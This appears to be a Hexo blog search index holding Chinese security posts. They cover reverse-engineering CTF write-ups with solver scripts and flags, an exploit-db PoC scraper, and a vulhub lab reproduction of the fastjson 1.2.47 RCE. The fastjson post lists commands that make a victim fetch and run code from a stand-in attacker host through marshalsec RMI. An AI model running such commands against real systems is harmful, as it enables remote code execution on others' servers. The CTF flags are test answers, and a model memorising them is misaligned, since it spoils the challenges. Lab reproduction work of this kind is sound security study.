<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>0x01ichunqiu逆向刷题</title>
    <url>/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[<h4 id="ichunqiu逆向刷题"><a href="#ichunqiu逆向刷题" class="headerlink" title="ichunqiu逆向刷题"></a>ichunqiu逆向刷题</h4><a id="more"></a>

<h5 id="1、小菜一碟：re100"><a href="#1、小菜一碟：re100" class="headerlink" title="1、小菜一碟：re100"></a>1、小菜一碟：re100</h5><p>下载后，不知道是什么文件，用Notepad先看下</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009173852508.png" alt="image-20201009173852508"></p>
<p>发现关键字符：AndroidManifest.xml</p>
<p>改后缀名为apk，在模拟器中运行看看</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009174041684.png" alt="image-20201009174041684"></p>
<p>猜测是输入flag后会有成功的弹窗之类的</p>
<p>放到Androidkiller里看看</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009173927463.png" alt="image-20201009173927463"></p>
<p>反编译成功，查看一些关键性字符，找到”success”</p>
<p>查看java源码，分析</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009174441430.png" alt="image-20201009174441430"></p>
<p>查看encode加密代码，是md5</p>
<p>所以将字符串”NzU2ZDJmYzg0ZDA3YTM1NmM4ZjY4ZjcxZmU3NmUxODk=”先base64解码，然后Md5解密，然后翻转一下，即可获得flag:jlflag{admin123}</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009174409777.png" alt="image-20201009174409777"></p>
<h5 id="2、Classical-CrackMe"><a href="#2、Classical-CrackMe" class="headerlink" title="2、Classical CrackMe"></a>2、Classical CrackMe</h5><p>是一个exe文件，提示是注册码就是flag，打开运行</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009174631889.png" alt="image-20201009174631889"></p>
<p>猜测会出现”注册成功”的弹窗</p>
<p>放入IDA中，寻找关键字，分析</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009174832915.png" alt="image-20201009174832915"></p>
<p>即可找到对应的字符串，这个编码方式，用base64解码，即可得到flag</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009174917940.png" alt="image-20201009174917940"></p>
<h5 id="3、FindKey-pyc"><a href="#3、FindKey-pyc" class="headerlink" title="3、FindKey-.pyc"></a>3、FindKey-.pyc</h5><p>下载文件，不知道是什么文件，用notepad打开看，能看到有关键字，但是感觉也没有明显特征能说明是什么文件，开始各种猜测</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201110112824228.png" alt="image-20201110112824228"></p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201110112848494.png" alt="image-20201110112848494"></p>
<p>猜了一会儿，后缀名改成.py后能运行了，但是无法直接分析这个.py文件，猜测是加密了</p>
<p>将后缀改成.pyc，使用easy python decompiler反编译，成功，得到一个findkey.pyc_dis文件</p>
<p>打开后可以看到正常的Python代码，Pwda,lookup和pwdb是三个数组，分析</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009175704669.png" alt="image-20201009175704669"></p>
<p>编写一个脚本，思路：</p>
<p>一开始是想随机生成一个长度为17的字符串，然后把这个字符串用判定条件进行判定</p>
<p>但是后来觉得这样跑起来比较复杂费时并且存在一些问题</p>
<p>转换思路：将常用的字符列成数组，根据判定条件跑出每一个字符，最后组成字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">chars &#x3D; [&#39;A&#39;, &#39;a&#39;, &#39;B&#39;, &#39;b&#39;, &#39;C&#39;, &#39;c&#39;, &#39;D&#39;, &#39;d&#39;, &#39;E&#39;, &#39;e&#39;, &#39;F&#39;, &#39;f&#39;, &#39;G&#39;, &#39;g&#39;,</span><br><span class="line">         &#39;H&#39;, &#39;h&#39;, &#39;I&#39;, &#39;i&#39;, &#39;J&#39;, &#39;j&#39;, &#39;K&#39;, &#39;k&#39;, &#39;L&#39;, &#39;l&#39;, &#39;M&#39;, &#39;m&#39;, &#39;N&#39;, &#39;n&#39;, &#39;O&#39;, &#39;o&#39;, &#39;P&#39;, &#39;p&#39;, &#39;Q&#39;, &#39;q&#39;,</span><br><span class="line">         &#39;R&#39;, &#39;r&#39;, &#39;S&#39;, &#39;s&#39;, &#39;T&#39;, &#39;t&#39;, &#39;U&#39;, &#39;u&#39;, &#39;V&#39;, &#39;v&#39;, &#39;W&#39;, &#39;w&#39;, &#39;X&#39;, &#39;x&#39;, &#39;Y&#39;,</span><br><span class="line">         &#39;y&#39;, &#39;Z&#39;, &#39;z&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;-&#39;, &#39;_&#39;, &#39;(&#39;, &#39;)&#39;, &#39;&#123;&#39;, &#39;&#125;&#39;]</span><br><span class="line">for i in range(0, 17):</span><br><span class="line">    for t in range(0, 68):</span><br><span class="line">        m &#x3D; chars[t]</span><br><span class="line">        if ord(m) + pwda[i] &amp; 255 &#x3D;&#x3D; lookup[i + pwdb[i]]:</span><br><span class="line">            flag +&#x3D; m</span><br><span class="line"></span><br><span class="line">flag &#x3D; flag[::-1]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>成功跑出flag：PCTF{PyC_Cr4ck3r}</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201009180535166.png" alt="image-20201009180535166"></p>
<h5 id="4、crackme-Python编写异或"><a href="#4、crackme-Python编写异或" class="headerlink" title="4、crackme-Python编写异或"></a>4、crackme-Python编写异或</h5><p>下载文件，运行，发现有特殊字符”flag”</p>
<p>放到IDA里查看</p>
<p>发现能反编译的代码很少，怀疑加壳</p>
<p>查壳，加了ns的壳，搜索一下是北斗的壳，用脱壳机脱了即可</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201010140519865.png" alt="image-20201010140519865"></p>
<p>重新放到IDA中</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201010140526805.png" alt="image-20201010140526805"></p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201010140559743.png" alt="image-20201010140559743"></p>
<p>看到重点代码，编写脚本即可跑出flag</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201010140639734.png" alt="image-20201010140639734"></p>
<p><img src="/Users/kami/Desktop/%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91/CTF%E9%80%86%E5%90%91%E9%A2%98/typora-user-images/image-20201010140648427.png" alt="image-20201010140648427"></p>
<p>编写脚本过程中的问题：</p>
<p>一开始是想使用上次一样的方法，遍历flag字符然后按照原代码进行异或操作，但是由于对异或运算不了解和Python编写不熟，一直跑不出</p>
<p>此题注意：</p>
<p>异或运算：a^b^a=b,a^b=b^a,a^a=0,a^0=a</p>
<p>Python编写异或，ord(),chr(),十六进制的数组方式</p>
<p>可以直接用两个数组异或得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">byte_402130 &#x3D; &#39;this_is_not_flag&#39;</span><br><span class="line">dword_402150 &#x3D; [0x12, 0x4, 0x8, 0x14, 0x24, 0x5C, 0x4A, 0x3D, 0x56, 0x0A, 0x10, 0x67,</span><br><span class="line">                0x0, 0x41, 0x0, 0x1, 0x46, 0x5A, 0x44, 0x42, 0x6E, 0x0C, 0x44, 0x72, 0x0C, 0x0D, 0x40, 0x3E, 0x4B, 0x5F, 0x2, 0x1,</span><br><span class="line">                0x4C, 0x5E, 0x5B, 0x17, 0x6E, 0x0C, 0x16, 0x68, 0x5B, 0x12]</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0, 42):</span><br><span class="line">    flag +&#x3D; chr(ord(byte_402130[i % 16]) ^ dword_402150[i])</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>跑出得到flag{59b8ed8f-af22-11e7-bb4a-3cf862d1ee75}</p>
<h5 id="5、CrackMe01-postmessagew"><a href="#5、CrackMe01-postmessagew" class="headerlink" title="5、CrackMe01-postmessagew"></a>5、CrackMe01-postmessagew</h5><p>查壳，无壳</p>
<p>放到IDA里查看，未搜到关键字，运行，发现有输入框，查看关键函数（如getwindowtext等</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012171116868.png" alt="image-20201012171116868"></p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012171141100.png" alt="image-20201012171141100"></p>
<p>查找主要代码sub_402650（调用了sub_418B95</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012171248771.png" alt="image-20201012171248771"></p>
<p>发现postmessagew函数，在这里可以查看各种函数的定义：<a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-postmessagew">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-postmessagew</a></p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012171342573.png" alt="image-20201012171342573"></p>
<p>postmessagew有四个参数，动态跑一下看看四个参数分别代表什么</p>
<p>动态跑程序时，在getwindowtextw处下断点，然后F8单步运行，跳到Postmessagew时将鼠标放到对应参数上即可看到</p>
<p>lParam:输入字符的个数</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012171443991.png" alt="image-20201012171443991"></p>
<p>wParam:输入的字符</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012171449452.png" alt="image-20201012171449452"></p>
<p>查看句柄hWnd:</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012172152822.png" alt="image-20201012172152822"></p>
<p>除了sub_402650调用以外，还有一个sub_402990函数</p>
<p>跟进去看看</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012172232914.png" alt="image-20201012172232914"></p>
<p>查看调用的函数sub_4027F0</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012172309659.png" alt="image-20201012172309659"></p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012172405031.png" alt="image-20201012172405031"></p>
<p>查看chText数组</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012172330350.png" alt="image-20201012172330350"></p>
<p>注意：是两个字节一起</p>
<p>编写脚本：</p>
<p>final = 0x4B6<br>chText = [0x4F0, 0x4DA, 0x4D7, 0x4D1, 0x48C, 0x4FF, 0x4F5, 0x4FE, 0x4E3, 0x4F8, 0x4E7, 0x4FF, 0x4E3, 0x4E9,<br>          0x4F0, 0x4F3, 0x425, 0x480, 0x484, 0x4F2, 0x4F4, 0x4F3]<br>for i in range(0, 22):<br>            v6 = chr(chText[i] ^ final)<br>            print(v6, end=’’)</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201110114140386.png" alt="image-20201110114140386"></p>
<p>得到flag:ICHUNQIU_FE362DBE</p>
<p>参考：<a href="https://blog.csdn.net/wangtiankuo/article/details/81201853">https://blog.csdn.net/wangtiankuo/article/details/81201853</a></p>
<p><a href="https://www.cnblogs.com/wanghj-dz/p/3973543.html">https://www.cnblogs.com/wanghj-dz/p/3973543.html</a></p>
<p><a href="https://www.cnblogs.com/qq78292959/archive/2012/07/20/2600865.html">https://www.cnblogs.com/qq78292959/archive/2012/07/20/2600865.html</a></p>
<h5 id="6、Smali-smali2java"><a href="#6、Smali-smali2java" class="headerlink" title="6、Smali-smali2java"></a>6、Smali-smali2java</h5><p>下载了一个smali文件，根据搜索，可以将Smali文件转成Java,利用软件smali2java转为java文件</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012173233305.png" alt="image-20201012173233305"></p>
<p>可以看到是一个base64+AES的解密过程</p>
<p>p1是加密的内容，p2是AES密钥</p>
<p>参考：<a href="https://www.cnblogs.com/caizhaokai/p/10944667.html">https://www.cnblogs.com/caizhaokai/p/10944667.html</a></p>
<p>一开始直接解p1的base64，没解出来，然后p1p2都放到AES解密，也没解出来</p>
<p>就想要直接运行java程序跑的，发现有很多包的问题</p>
<p>然后解了一下p2的base64，出了明文</p>
<p>然后放到AES里解密</p>
<p>成功解出flag：PCTF{Sm4liRiver}</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201012164303217.png" alt="image-20201012164303217"></p>
<h5 id="7、小菜两碟-PE文件头修复"><a href="#7、小菜两碟-PE文件头修复" class="headerlink" title="7、小菜两碟-PE文件头修复"></a>7、小菜两碟-PE文件头修复</h5><p>一个无法正常打开的文件，用editor看一下，查找到关键字</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201013162905495.png" alt="image-20201013162905495"></p>
<p>尝试多种猜测后，应该是个exe，但是无法正常打开，怀疑PE头损坏</p>
<p>参考：<a href="https://www.cnblogs.com/2f28/p/9824366.html">https://www.cnblogs.com/2f28/p/9824366.html</a></p>
<p><a href="https://bbs.pediy.com/thread-248817.htm">https://bbs.pediy.com/thread-248817.htm</a></p>
<p>并打开一个正常的exe文件进行对比</p>
<p>发现两处错误，50450000是PE文件头，3C处是PE文件头地址（E9）</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201013163053400.png" alt="image-20201013163053400"></p>
<p>修改为如下情况：</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201013163105139.png" alt="image-20201013163105139"></p>
<p>修改之后可以正常放入IDA中分析了，无壳</p>
<p>根据关键字，找到主函数代码，反编译一下，分析</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201013163410920.png" alt="image-20201013163410920"></p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201013163418420.png" alt="image-20201013163418420"></p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201013163442850.png" alt="image-20201013163442850"></p>
<p>可以看到flag是由前三个数字加上’abc’组成的，即v20,21,22</p>
<p>编写脚本跑出前三个数字：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for v20 in range(0, 100):</span><br><span class="line">    for v21 in range(0, 100):</span><br><span class="line">        v22 &#x3D; (v21 ^ v20) + 4</span><br><span class="line">        if(v22 * v21 * v20 &#x2F;&#x2F; 11 &#x3D;&#x3D; 106):</span><br><span class="line">           if((v22 + v21 + v20) % 100 &#x3D;&#x3D; 34):</span><br><span class="line">                print(v20, v21, v22)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201013133507441.png" alt="image-20201013133507441"></p>
<p>然后一个个尝试即可</p>
<p><img src="/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/image-20201013163550796.png" alt="image-20201013163550796"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>PE文件头修复</tag>
        <tag>.pyc文件</tag>
        <tag>smali2java</tag>
      </tags>
  </entry>
  <entry>
    <title>0x01python-spider-exploit-db</title>
    <url>/2020/12/03/0x01python-spider-exploit-db/</url>
    <content><![CDATA[<p>在一次寻找大批量的久远漏洞的poc的时候，我这个python小白决定顺手写个exploit-db的爬虫</p>
<a id="more"></a>

<p>这类爬虫的项目其实还是有蛮多可以参考的</p>
<p>我的主要需求：已知cve号，搜索是否有poc并返回poc页面</p>
<p>先进行一次搜索流程</p>
<p>在输入框输入cve号，页面就会显示出链接</p>
<p><img src="/2020/12/03/0x01python-spider-exploit-db/image-20210105144411007.png" alt="image-20210105144411007"></p>
<p>点击后，这个就是我们需要的poc的url：<a href="https://www.exploit-db.com/exploits/49068">https://www.exploit-db.com/exploits/49068</a></p>
<p><img src="/2020/12/03/0x01python-spider-exploit-db/image-20210105144437086.png" alt="image-20210105144437086"></p>
<p>多尝试几个就可以知道poc的url就是”<a href="https://www.exploit-db.com/exploits/+%E6%9F%90%E6%95%B0%E5%AD%97&quot;%EF%BC%8C%E9%82%A3%E4%B9%88%E8%BF%99%E4%B8%AA%E6%9F%90%E6%95%B0%E5%AD%97%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E8%BF%94%E5%9B%9E%E7%9A%84">https://www.exploit-db.com/exploits/+某数字&quot;，那么这个某数字就是我们需要返回的</a></p>
<p>抓包，得到请求包，找到对应的cve号输入的位置search[value]，修改为我们可以输入的参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url &#x3D; &#39;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;?draw&#x3D;2&amp;columns[0][data]&#x3D;date_published&amp;columns[0][name]&#x3D;date_published&amp;columns[0][searchable]&#x3D;true&amp;columns[0][orderable]&#x3D;true&amp;columns[0][search][value]&#x3D;&amp;columns[0][search][regex]&#x3D;false&amp;columns[1][data]&#x3D;download&amp;columns[1][name]&#x3D;download&amp;columns[1][searchable]&#x3D;false&amp;columns[1][orderable]&#x3D;false&amp;columns[1][search][value]&#x3D;&amp;columns[1][search][regex]&#x3D;false&amp;columns[2][data]&#x3D;application_md5&amp;columns[2][name]&#x3D;application_md5&amp;columns[2][searchable]&#x3D;true&amp;columns[2][orderable]&#x3D;false&amp;columns[2][search][value]&#x3D;&amp;columns[2][search][regex]&#x3D;false&amp;columns[3][data]&#x3D;verified&amp;columns[3][name]&#x3D;verified&amp;columns[3][searchable]&#x3D;true&amp;columns[3][orderable]&#x3D;false&amp;columns[3][search][value]&#x3D;&amp;columns[3][search][regex]&#x3D;false&amp;columns[4][data]&#x3D;description&amp;columns[4][name]&#x3D;description&amp;columns[4][searchable]&#x3D;true&amp;columns[4][orderable]&#x3D;false&amp;columns[4][search][value]&#x3D;&amp;columns[4][search][regex]&#x3D;false&amp;columns[5][data]&#x3D;type_id&amp;columns[5][name]&#x3D;type_id&amp;columns[5][searchable]&#x3D;true&amp;columns[5][orderable]&#x3D;false&amp;columns[5][search][value]&#x3D;&amp;columns[5][search][regex]&#x3D;false&amp;columns[6][data]&#x3D;platform_id&amp;columns[6][name]&#x3D;platform_id&amp;columns[6][searchable]&#x3D;true&amp;columns[6][orderable]&#x3D;false&amp;columns[6][search][value]&#x3D;&amp;columns[6][search][regex]&#x3D;false&amp;columns[7][data]&#x3D;author_id&amp;columns[7][name]&#x3D;author_id&amp;columns[7][searchable]&#x3D;false&amp;columns[7][orderable]&#x3D;false&amp;columns[7][search][value]&#x3D;&amp;columns[7][search][regex]&#x3D;false&amp;columns[8][data]&#x3D;code&amp;columns[8][name]&#x3D;code.code&amp;columns[8][searchable]&#x3D;true&amp;columns[8][orderable]&#x3D;true&amp;columns[8][search][value]&#x3D;&amp;columns[8][search][regex]&#x3D;false&amp;columns[9][data]&#x3D;id&amp;columns[9][name]&#x3D;id&amp;columns[9][searchable]&#x3D;false&amp;columns[9][orderable]&#x3D;true&amp;columns[9][search][value]&#x3D;&amp;columns[9][search][regex]&#x3D;false&amp;order[0][column]&#x3D;9&amp;order[0][dir]&#x3D;desc&amp;start&#x3D;0&amp;length&#x3D;15&amp;search[value]&#x3D;%s&amp;search[regex]&#x3D;false&amp;author&#x3D;&amp;port&#x3D;&amp;type&#x3D;&amp;tag&#x3D;&amp;platform&#x3D;&amp;_&#x3D;1606893892234&#39;%s</span><br></pre></td></tr></table></figure>

<p>刚开始直接获取的是返回的页面的html，但是没有相关数字的信息，一度以为自己写错了，毕竟这算是我第二次写爬虫。后来查看页面源代码，确实没有相关的信息，跑去问gps(前端，才知道是拿了接口返回的数据，塞到网页里</p>
<p>f12后发现在json数据包里</p>
<p><img src="/2020/12/03/0x01python-spider-exploit-db/image-20210105145116203.png" alt="image-20210105145116203"></p>
<p>于是开始研究怎么获取json包的数据</p>
<p>重点函数：spider_request.json()</p>
<p>但是一开始使用这个函数一直报错，提示没有返回json，确认了下请求头也没有错误</p>
<p><img src="/2020/12/03/0x01python-spider-exploit-db/image-20210105150842464.png" alt="image-20210105150842464"></p>
<p>改了很久，最后将header改为这样就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">header &#x3D; &#123;</span><br><span class="line">    &#39;Accept&#39;: &#39;application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01&#39;,</span><br><span class="line">    &#39;Sec-Fetch-Mode&#39;: &#39;cors&#39;,</span><br><span class="line">    &#39;User-Agent&#39;: random.choice(ua_list),</span><br><span class="line">    &#39;X-Requested-With&#39;: &#39;XMLHttpRequest&#39;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>运行效果：</p>
<p><img src="/2020/12/03/0x01python-spider-exploit-db/image-20210105151415897.png" alt="image-20210105151415897"></p>
<p>项目地址：<a href="https://github.com/0xkami/expolit-db-spider">https://github.com/0xkami/expolit-db-spider</a></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>exploit-db</tag>
      </tags>
  </entry>
  <entry>
    <title>0x01第一个docker漏洞环境搭建复现fastjson</title>
    <url>/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/</url>
    <content><![CDATA[<h4 id="第一个docker漏洞环境搭建复现"><a href="#第一个docker漏洞环境搭建复现" class="headerlink" title="第一个docker漏洞环境搭建复现"></a>第一个docker漏洞环境搭建复现</h4><p>由于某原因要进行fastjson漏洞的复现，已获得脚本及exp</p>
<a id="more"></a>

<h5 id="0x1-搭建docker（mac版）"><a href="#0x1-搭建docker（mac版）" class="headerlink" title="0x1 搭建docker（mac版）"></a>0x1 搭建docker（mac版）</h5><p>参考链接：<a href="https://www.runoob.com/docker/macos-docker-install.html">https://www.runoob.com/docker/macos-docker-install.html</a></p>
<p>安装成功后进行初始化</p>
<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115207734.png" alt="image-20201109115207734"></p>
<p>问题：发现80端口被占用</p>
<p>解决：<a href="https://blog.csdn.net/haha223545/article/details/105244919%EF%BC%8C%E6%98%AFapache%E5%8D%A0%E7%94%A8%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%81%9C%E6%AD%A2apache%E6%9C%8D%E5%8A%A1%E5%8D%B3%E5%8F%AF%EF%BC%9Asudo">https://blog.csdn.net/haha223545/article/details/105244919，是apache占用了，所以停止apache服务即可：sudo</a> apachectl stop</p>
<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115229824.png" alt="image-20201109115229824"></p>
<h5 id="0x2-从git上拉取漏洞环境靶机vulhub（mac需要装好Git）"><a href="#0x2-从git上拉取漏洞环境靶机vulhub（mac需要装好Git）" class="headerlink" title="0x2 从git上拉取漏洞环境靶机vulhub（mac需要装好Git）"></a>0x2 从git上拉取漏洞环境靶机vulhub（mac需要装好Git）</h5><p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115254393.png" alt="image-20201109115254393"></p>
<p>进入后能看到有许多漏洞环境</p>
<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115311533.png" alt="image-20201109115311533"></p>
<h5 id="0x3-使用docker"><a href="#0x3-使用docker" class="headerlink" title="0x3 使用docker"></a>0x3 使用docker</h5><p>进入对应的文件夹，使用docker-compose up</p>
<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115334588.png" alt="image-20201109115334588"></p>
<p>成功启动，漏洞环境已经搭好</p>
<h5 id="0x4-开始漏洞攻击复现"><a href="#0x4-开始漏洞攻击复现" class="headerlink" title="0x4 开始漏洞攻击复现"></a>0x4 开始漏洞攻击复现</h5><p>从docker中登录受害者靶机，可以查看是否有文件生成</p>
<p>​    docker ps -a：查看ID</p>
<p>​    docker exec -it ID /bin/bash</p>
<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115443747.png" alt="image-20201109115443747"></p>
<p>接下来有两种方式：</p>
<p>1、使用另一台计算机作为攻击机和服务器端，进行攻击</p>
<p>2、使用docker搭建一个服务器端，本机作为攻击机（不然攻击机和受害机IP会相同）</p>
<p>第一种方法实践：</p>
<p>选择同一网段下的另一个计算机，搭建服务器端</p>
<p>查看IP，开启python Http服务（注意要和rmi在同一文件夹下开启，不然无法访问到文件的），打开rmi服务</p>
<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109114538181.png" alt="image-20201109114538181"></p>
<p>IP为10.141.0.125，攻击语句：</p>
<p>1、python3 -m http.server –bind 0.0.0.0 8888</p>
<p>2、java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “<a href="http://x.x.x.x:8888/#Exploit&quot;">http://x.x.x.x:8888/#Exploit&quot;</a> 9999</p>
<p>3、python3 fastjson-1.2.47_rce.py <a href="http://s.s.s.s:8080/">http://s.s.s.s:8080/</a> rmi://x.x.x.x:9999/Exploit</p>
<p>其中，第一句中的8888端口要与第二句中的8888，端口号可改但须一致，第二句中的9999和第三句中的9999，端口号可改但须一致，x.x.x.x为本机IP，即攻击者ip，s.s.s.s为受害者靶机Ip,端口8080需要根据靶机环境进行更改</p>
<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109114938652.png" alt="image-20201109114938652"></p>
<p>攻击成功后，能在受害者靶机上看到exphub文件，在http上也能看见请求</p>
<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115025283.png" alt="image-20201109115025283"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>0x02CVE-2020-1472漏洞复现</title>
    <url>/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="CVE-2020-1472漏洞复现"><a href="#CVE-2020-1472漏洞复现" class="headerlink" title="CVE-2020-1472漏洞复现"></a>CVE-2020-1472漏洞复现</h4><p>用了大半天时间，开局一张图，复现全靠蒙：</p>
